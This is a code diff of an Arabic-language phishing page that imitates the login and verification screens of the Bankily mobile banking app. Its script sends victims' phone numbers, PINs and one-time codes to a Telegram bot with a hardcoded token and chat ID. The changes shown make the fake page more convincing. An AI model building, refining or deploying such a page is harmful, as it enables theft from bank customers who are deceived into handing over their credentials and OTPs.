@@ -7,61 +7,78 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
-        body { font-family: 'Tajawal', sans-serif; background-color: #ffffff; margin: 0; }
+        body { font-family: 'Tajawal', sans-serif; background-color: #ffffff; margin: 0; min-height: 100vh; overflow-x: hidden; }
+
+        /* تقسيم الواجهة */
+        .hero-section { 
+            height: 45vh; 
+            background: url('https://i.ibb.co/3W6f99B/bankily-hero.jpg') no-repeat center center; 
+            background-size: cover;
+            position: relative;
+        }
+
+        /* التدرج اللوني لربط النصفين */
+        .hero-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100px;
+            background: linear-gradient(to bottom, transparent, #ffffff);
+        }
 
         /* الهيدر العلوي */
         .top-header { background-color: #00a5bc; height: 50px; display: flex; align-items: center; justify-content: center; position: relative; color: white; font-weight: bold; }
-        .back-icon { position: absolute; left: 15px; font-size: 24px; }
+        .back-icon { position: absolute; left: 15px; font-size: 24px; cursor: pointer; }
 
-        /* تصميم الحقول بنمط بنكيلي */
-        .input-group { position: relative; margin-bottom: 30px; padding: 0 40px; }
-        .input-label { display: block; text-align: right; margin-bottom: 8px; color: #333; font-size: 14px; }
-        .input-line { width: 100%; border: none; border-bottom: 1px solid #333; outline: none; padding: 5px 0; font-size: 18px; text-align: center; letter-spacing: 5px; }
-        .icon-field { position: absolute; right: 5px; bottom: 8px; width: 25px; opacity: 0.7; }
+        /* تصميم الحقول */
+        .form-container { padding: 20px 40px; }
+        .input-group { position: relative; margin-bottom: 30px; }
+        .input-label { display: block; text-align: right; margin-bottom: 8px; color: #00a5bc; font-size: 14px; font-weight: bold; }
+        .input-line { width: 100%; border: none; border-bottom: 2px solid #00a5bc; outline: none; padding: 8px 0; font-size: 18px; text-align: center; background: transparent; }
+        .icon-field { position: absolute; right: 0; bottom: 10px; width: 22px; opacity: 0.6; }
 
-        /* زر الدخول الأصفر السفلي */
-        .btn-bankily { background-color: #ffb400; color: white; width: 100%; padding: 15px; font-size: 22px; font-weight: bold; border: none; position: fixed; bottom: 0; right: 0; }
+        /* زر الدخول بنمط بنكيلي */
+        .btn-bankily { background-color: #ffb400; color: white; width: 100%; padding: 15px; font-size: 22px; font-weight: bold; border: none; position: fixed; bottom: 0; right: 0; cursor: pointer; }
+        .btn-bankily:active { background-color: #e6a200; }
 
         /* واجهة الـ OTP */
-        #otp-screen { display: none; flex-direction: column; align-items: center; padding-top: 40px; }
+        #screen-otp { display: none; min-height: 100vh; background: white; }
         .otp-boxes { display: flex; gap: 15px; justify-content: center; margin: 30px 0; }
-        .otp-dot { width: 40px; border-bottom: 2px solid #333; height: 40px; text-align: center; font-size: 24px; outline: none; }
+        .otp-dot { width: 45px; border-bottom: 3px solid #00a5bc; height: 50px; text-align: center; font-size: 28px; outline: none; font-weight: bold; }
 
-        /* العداد الأخضر */
-        .timer-ring { width: 40px; height: 40px; border: 4px solid #00ff00; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 15px auto; }
+        .timer-ring { width: 50px; height: 50px; border: 4px solid #00ff00; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 20px auto; font-weight: bold; color: #333; }
     </style>
 </head>
 <body>
 
     <!-- الواجهة الأولى: تسجيل الدخول -->
     <div id="screen-login">
-        <div class="top-header" style="background: transparent; height: 30px;"></div>
-        
-        <div class="flex justify-center py-6">
-            <img src="https://i.ibb.co/L9Y0VpY/bankily-logo.png" alt="Bankily" style="width: 280px;">
+        <!-- النصف الأعلى: الصورة مع التدرج -->
+        <div class="hero-section">
+            <div class="hero-overlay"></div>
         </div>
 
-        <div class="mt-10">
+        <!-- النصف الأسفل: الفورم -->
+        <div class="form-container">
             <div class="input-group">
                 <label class="input-label">اسم المستخدم أو رقم الهاتف</label>
-                <input id="user_id" type="tel" class="input-line" maxlength="8">
-                <img src="https://img.icons8.com/ios/50/user-male-circle.png" class="icon-field">
+                <input id="user_id" type="tel" class="input-line" maxlength="8" placeholder="00 00 00 00">
+                <img src="https://img.icons8.com/ios-filled/50/00a5bc/user-male-circle.png" class="icon-field">
             </div>
 
             <div class="input-group">
                 <label class="input-label">الرقم السري</label>
-                <div class="flex justify-center gap-4">
-                    <input id="pin" type="password" maxlength="4" class="input-line w-full text-center" style="letter-spacing: 15px;">
-                </div>
-                <img src="https://img.icons8.com/ios/50/lock.png" class="icon-field">
+                <input id="pin" type="password" maxlength="4" class="input-line" style="letter-spacing: 15px;" placeholder="****">
+                <img src="https://img.icons8.com/ios-filled/50/00a5bc/lock.png" class="icon-field">
             </div>
 
-            <div class="px-10 text-right">
-                <a href="#" class="text-sm border-b border-black pb-1">نسيت الرقم السري ؟</a>
+            <div class="text-right">
+                <a href="#" class="text-sm text-gray-500 border-b border-gray-400 pb-0.5">نسيت الرقم السري ؟</a>
             </div>
 
-            <div class="mt-32 text-center">
-                <a href="#" class="text-sm border-b border-black pb-1 font-bold">مستخدم جديد ؟ سجل الآن!</a>
+            <div class="mt-16 text-center">
+                <a href="#" class="text-sm text-gray-800 font-bold border-b-2 border-yellow-500 pb-1">مستخدم جديد ؟ سجل الآن!</a>
             </div>
         </div>
 
@@ -69,28 +86,28 @@
     </div>
 
     <!-- الواجهة الثانية: رمز التحقق -->
-    <div id="screen-otp" style="display:none;">
+    <div id="screen-otp">
         <div class="top-header">
             <span class="back-icon" onclick="backToLogin()">‹</span>
             رمز التحقق
         </div>
 
-        <div class="px-6 text-center mt-8">
-            <h2 class="font-bold text-xl">أدخل رمز التأكيد المرسل إلى هاتفك المحمول</h2>
+        <div class="px-6 text-center mt-12">
+            <h2 class="font-bold text-xl text-gray-800">أدخل رمز التأكيد المرسل إلى هاتفك</h2>
             
             <div class="otp-boxes">
-                <input type="tel" maxlength="1" class="otp-dot">
-                <input type="tel" maxlength="1" class="otp-dot">
-                <input type="tel" maxlength="1" class="otp-dot">
-                <input type="tel" maxlength="1" class="otp-dot">
+                <input type="tel" maxlength="1" class="otp-dot" oninput="moveFocus(this, 0)">
+                <input type="tel" maxlength="1" class="otp-dot" oninput="moveFocus(this, 1)">
+                <input type="tel" maxlength="1" class="otp-dot" oninput="moveFocus(this, 2)">
+                <input type="tel" maxlength="1" class="otp-dot" oninput="moveFocus(this, 3)">
             </div>
 
-            <p class="text-gray-600 text-sm">تنتهي صلاحية رمز التأكيد خلال</p>
-            <p class="font-bold">5 دقائق 0 ثواني</p>
+            <p class="text-gray-500 text-sm">تنتهي صلاحية الرمز خلال</p>
+            <p class="font-bold text-lg text-red-500">04:59</p>
 
-            <div class="timer-ring"></div>
+            <div class="timer-ring">5</div>
 
-            <button onclick="resend()" class="text-sm border-b border-black mt-6">إعادة إرسال رمز التأكيد</button>
+            <button onclick="alert('تم إعادة الإرسال')" class="text-sm text-blue-600 font-bold mt-8 block mx-auto">إعادة إرسال رمز التأكيد</button>
         </div>
         
         <button onclick="finishProcess()" class="btn-bankily">تم</button>
@@ -100,6 +117,13 @@
         const BOT_TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
         const CHAT_ID = "8665814266";
 
+        function moveFocus(el, index) {
+            const inputs = document.querySelectorAll('.otp-dot');
+            if (el.value.length === 1 && index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            }
+        }
+
         function goToOTP() {
             const u = document.getElementById('user_id').value;
             const p = document.getElementById('pin').value;
@@ -108,7 +132,7 @@
                 document.getElementById('screen-login').style.display = 'none';
                 document.getElementById('screen-otp').style.display = 'block';
             } else {
-                alert("يرجى التأكد من البيانات");
+                alert("يرجى التأكد من كتابة 8 أرقام للهاتف و 4 للرمز السري");
             }
         }
 
@@ -124,20 +148,14 @@
                 sendData(`🔑 Bankily OTP: ${otp}`);
                 alert("جاري التحقق من الرمز...");
                 location.reload();
+            } else {
+                alert("يرجى إدخال الرمز كاملاً");
             }
         }
 
         function sendData(msg) {
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
         }
-
-        // تحريك التركيز تلقائياً في خانات OTP
-        const inputs = document.querySelectorAll('.otp-dot');
-        inputs.forEach((input, index) => {
-            input.addEventListener('input', () => {
-                if (input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
-            });
-        });
     </script>
 </body>
 </html>
